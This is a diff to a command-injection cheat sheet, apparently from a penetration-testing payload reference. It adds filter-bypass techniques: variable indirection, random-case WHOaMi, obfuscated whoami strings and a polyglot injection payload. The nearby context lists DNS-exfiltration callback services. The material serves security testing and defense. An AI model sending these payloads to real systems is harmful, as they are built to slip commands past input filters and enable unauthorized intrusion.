@@ -13,9 +13,11 @@
 * [Filter Bypasses](#filter-bypasses)
     * [Bypass Without Space](#bypass-without-space)
     * [Bypass With A Line Return](#bypass-with-a-line-return)
+    * [Bypass via variable](#bypass-via-variable)
     * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
     * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
     * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
+    * [Bypass via Random Case](#bypass-via-random-case)
     * [Bypass Characters Filter](#bypass-characters-filter)
     * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
     * [Bypass With Single Quote](#bypass-with-single-quote)
@@ -192,6 +194,21 @@ Sometimes, direct command execution from the injection might not be possible, bu
   ping%CommonProgramFiles:~10,-18%127.0.0.1
   ping%PROGRAMFILES:~10,-5%127.0.0.1
   ```
+### Bypass via variable
+
+Command can be defined in variable
+   ```bash
+   var=whoami
+   $var
+   ```
+
+### Bypass via Random Case
+In Windows, many commands are case-insensitive due to the nature of the Windows filesystem and command interpreter (`cmd.exe` or `PowerShell`).
+
+   ```powershell
+    WHOaMi
+   ```
+
 
 ### Bypass With A Line Return
 
@@ -306,6 +323,7 @@ wh""oami
 
 ```powershell
 wh``oami
+w``h``o``a``m``i
 ```
 
 ### Bypass With Backslash and Slash
@@ -321,6 +339,7 @@ w\ho\am\i
 
 ```powershell
 who$@ami
+w$@h$@o$@a$@m$@i
 echo whoami|$0
 ```
 
@@ -328,6 +347,7 @@ echo whoami|$0
 
 ```powershell
 who$()ami
+w$()$()$()$()h$()$()o$()$()a$()$()m$()$()i
 who$(echo am)i
 who`echo am`i
 ```
@@ -390,6 +410,7 @@ Online tools to check for DNS based data exfiltration:
 * [app.interactsh.com](https://app.interactsh.com)
 * [portswigger.net](https://portswigger.net/burp/documentation/collaborator)
 
+
 ## Polyglot Command Injection
 
 A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
@@ -402,6 +423,8 @@ A polyglot is a piece of code that is valid and executable in multiple programmi
   # Context inside commands with single and double quote:
   echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+  echo "Hello${}, ``````$@${}${}`whoami${}`"
+  
   echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   ```
 
